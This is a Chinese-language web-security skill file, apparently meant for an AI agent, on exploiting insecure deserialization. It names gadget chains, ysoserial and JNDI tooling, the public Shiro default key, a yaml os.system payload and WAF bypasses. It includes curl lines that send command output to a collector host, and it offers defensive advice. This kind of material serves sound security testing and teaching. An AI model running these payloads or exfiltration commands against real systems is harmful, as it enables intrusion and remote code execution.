---
source: test008008008008-glitch/web-security-skills
skill: 07-insecure-deserialization
fused: 2026-09-17
method: 五步猎洞法
---

---
name: insecure-deserialization
description: 不安全反序列化实战手册。当应用传输序列化对象（Java/PHP/Python）时使用，覆盖指纹识别、gadget 链选择、工具化利用与防御。
---

# 第七技 · 反序列化 —— 递给服务器一个"自己会动的对象"

> 猎手视角：序列化数据是"对象的快递包裹"。安全的做法是拆开验货，危险的做法是直接组装——而你递过去的包裹里，藏着一段到货即执行的说明书。

**目标读者**：具备基础 Web 测试与一门后端语言经验的安全工程师
**前置要求**：了解 Java/PHP 任一语言的序列化格式、能读懂报文中的 base64/hex blob

---

## 何时启用本技

- 报文里出现**特征 blob**：
  - Java：`rO0AB`（base64 开头）/ `AC ED 00 05`（hex）
  - PHP：`O:4:"User":2:` 结构、`Tzoy...`（base64）
  - Python：pickle 的 `gASV`（base64）、`.\x80\x04`
- 功能面：记住我（RememberMe Cookie）、会话传递、缓存内容（Redis/Memcached 里的对象）、RPC 协议（Dubbo/Hessian/RMI）、消息队列 payload
- 依赖面：目标使用已知存在 gadget 的组件（见指纹节）

---

## 一、原理拆解

```
正常流程:  对象 --序列化--> 字节流 --网络--> 字节流 --反序列化--> 重建对象
攻击流程:  构造恶意对象(引用了危险类) --序列化--> 字节流
           --> 服务端反序列化时触发了类的方法/魔术方法 --> 代码执行
```

关键认知：

1. **反序列化本身就是"代码执行引擎"**——只要类路径里存在"属性 → 危险行为"的链条
2. **gadget（触发链）是可遇不可求的弹药库**：某个普通类的 `readObject`/`__wakeup`/`__reduce` 里调了危险能力，这条链就成立
3. 防御的正确答案只有一个：**不给不可信数据反序列化的机会**（而不是"过滤关键字"）

---

## 二、五步猎洞法

### 第一步：识面 —— 找 blob 与依赖

- 抓包全文搜特征串（`rO0AB`、`O:\d+:`、`gASV`）
- 指纹依赖面：报错页、响应头、favicon hash、`/actuator`、`pom.xml` 泄露、WordPress 插件名——**知道后端组件，才知道有哪些 gadget 可用**

### 第二步：定点 —— 确认反序列化点真的在消费数据

把 blob 改坏（删尾字节）→ 报 `ClassNotFoundException`/`unserialize error` 类错误 = 服务端确实在做反序列化。报错本身也是堆栈情报。

### 第三步：验证 —— 选一条已知链试水

按语言选弹药（原理均为公开研究）：

**Java**（依赖决定弹药）：

| 组件 | 代表链 | 效果 |
|------|--------|------|
| Commons-Collections 3.x | CC1-CC7 | 命令执行 |
| Commons-Beanutils | CB1 | 命令执行 |
| Spring | Spring1/Spring2 | 命令执行 |
| Shiro ≤1.2.24 | rememberMe AES + CB 链 | 命令执行（含默认 Key 问题） |
| Fastjson/Jackson（JSON 反序列化族） | `@type`/enableDefaultTyping | JNDI 注入 |

工具链：ysoserial 生成 payload；Fastjson 场景用 JNDIExploit 类工具配合。

**PHP**：

| 场景 | 手法 |
|------|------|
| 有源码/已知类 | 魔术方法链（`__wakeup`/`__destruct`/`__toString`）手工构造 `O:` 串 |
| 框架已知 | phar:// 反序列化（绕过 unserialize 禁用）、Phar metadata |
| POP 链挖掘 | 源码审计找 `__destruct` 里可触发的方法调用 |

**Python**：pickle 签名校验缺失 → `__reduce__` 直接 RCE；`yaml.load`（非 safe_load）→ `!!python/object/apply:os.system`。

### 第四步：利用 —— 从执行到落地

- **命令执行验证**：优先"无回显也能确认"的方式——`curl http://<收数域>/$(whoami)`、DNSLog
- **JNDI 路线（Java）**：目标出网时 `ldap://`/`rmi://` 指向你的恶意服务端，加载远程类（JNDI 注入，注意高版本 JDK 的信任基线限制——本地 gadget 优先）
- **注意执行环境**：Java 进程用户权限决定能写哪里；容器环境下命令执行影响有限，转向"读凭据 → 横向"更实际

### 第五步：收官 —— 留证与克制

证明命令执行：`id`/`whoami` 输出或收数平台回连截图即停。**不部署 webshell、不动数据**——反序列化 RCE 的报告，一条回连截图就是满分证据。

---

## 三、实战推演（虚构场景）

> 场景：授权测试虚构管理系统 `crm.demo-example.com`（Java 栈）

1. **识面**：登录后 Cookie `rememberMe=<长base64>`，解码见 `rO0AB` 头——Java 序列化对象；报错页暴露 `Apache Shiro`
2. **定点**：base64 改坏一位，响应变 `IOException`——服务端在反序列化它
3. **验证**：Shiro ≤1.2.24 用默认 Key `kPH+bIxk5D2deZiIxcaaaA==` 加密 ysoserial CommonsBeanutils 链，rememberMe 重放——DNSLog 收到解析
4. **利用**：换 payload `curl http://collab.dns.example/$(id -u)` 收到带 UID 的请求，命令执行确认
5. **收官**：截图取证、报告高危（认证后 RCE + 默认密钥），修复建议：升级 Shiro、更换密钥、rememberMe 改签名 token

---

## 四、对抗与绕过

| 防线 | 砭解思路 |
|------|----------|
| WAF 拦 `rO0AB` 特征 | gzip 压缩 payload、自定义 base64 字母表（Shiro 100% 硬编码 Key 场景） |
| 黑名单封单条链 | ysoserial 多条链轮换——防住 CC1 防不住 CC6 是常态 |
| JNDI 高版本 JDK 限制 | 找本地 gadget 链；或利用目标本地 classpath 的二次 gadget（EL/JNDI bypass 路线） |
| PHP `__wakeup` 绕过 | 属性数量与实际不符（CVE-2016-7124，老版本） |
| `unserialize` 被禁 | phar:// 流包装（`file_exists("phar://x.jpg")` 触发反序列化） |
| 序列化数据有签名 | 无解——但检查签名是否覆盖全量字段、密钥是否硬编码 |

---

## 五、防御视角

1. **不要对不可信数据做原生反序列化**——用 JSON（无对象语义）替代
2. 必须用时：签名（防篡改）+ 严格类型白名单（`ObjectInputFilter`，Java 9+）
3. Shiro 场景：升级 + 更换密钥 + 部署具备已知链检测的 RASP
4. 依赖治理：OWASP Dependency-Check / Snyk 进 CI，锁死存在公开 gadget 的组件版本
5. 网络层：应用服务器出网最小化，掐断 JNDI 远程加载路线

---

## 六、踩坑记录

- Java 链**对版本敏感**：JDK 8u191 后 JNDI 远程加载默认不信任——payload 没回显先怀疑环境，不是链废了
- ysoserial 生成的链没动静：先测**纯回显链**（URLDNS）确认反序列化点活着，再上执行链——分两步排查效率高十倍
- Shiro Key 正确但 400：padding 问题，注意 AES-CBC 的 IV 与字节流组装顺序
- PHP 手工构造 `O:` 串时属性数错一个都失败——写小脚本用 `serialize()` 生成，别手拼
- 报告里别只写"存在反序列化"——**写清链名与触发条件**，开发才知道升级哪个组件

---

## 七、速查卡

```text
指纹:   Java rO0AB | PHP O:\d+: | pickle gASV
弹药:   ysoserial [链] [命令] | phar:// | yaml.load
验证:   URLDNS链先确认点活着 → 再上执行链
回显:   DNSLog + curl http://collab/$(id)
Java依赖: CC1-7 | CB1 | Shiro默认Key | Fastjson @type
防御:   改JSON + ObjectInputFilter + 依赖CI卡控
```
